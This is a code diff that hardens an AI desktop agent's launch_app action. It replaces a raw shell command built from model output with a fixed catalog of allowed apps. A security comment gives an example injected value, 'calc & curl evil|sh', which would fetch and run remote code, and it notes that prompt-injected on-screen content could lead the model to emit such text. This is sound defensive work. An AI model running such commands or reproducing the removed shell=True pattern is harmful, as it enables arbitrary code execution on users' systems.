@@ -774,13 +774,28 @@ class DesktopExecutor(Executor):
         if action.text is None:
             return self._fail(action, "launch_app requires text (app name)", FailureCategory.EXECUTION_ERROR)
         app_key = action.text.strip().lower()
-        command = APP_LAUNCH_TARGETS.get(app_key, action.text.strip())
+        # SECURITY: only launch apps from the trusted, developer-defined catalog.
+        # The command string passed to the shell below MUST be a fixed catalog
+        # constant — never untrusted model output. An LLM (or prompt-injected
+        # on-screen content) could otherwise emit text like "calc & curl evil|sh"
+        # and, under shell=True, achieve arbitrary command execution. Unknown
+        # apps are denied rather than executed as raw text.
+        command = APP_LAUNCH_TARGETS.get(app_key)
+        if command is None:
+            return self._fail(
+                action,
+                f"launch_app: '{action.text.strip()}' is not a recognized application; "
+                "only catalog apps can be launched.",
+                FailureCategory.EXECUTION_ERROR,
+            )
         try:
             if command.startswith("ms-"):
                 await asyncio.to_thread(os.startfile, command)  # type: ignore[attr-defined]
             else:
                 proc = await asyncio.to_thread(
                     subprocess.Popen,
+                    # nosec B602: `command` is a hardcoded catalog constant (above),
+                    # not user/model input, so shell=True carries no injection risk.
                     command,
                     shell=True,
                     stdout=subprocess.DEVNULL,
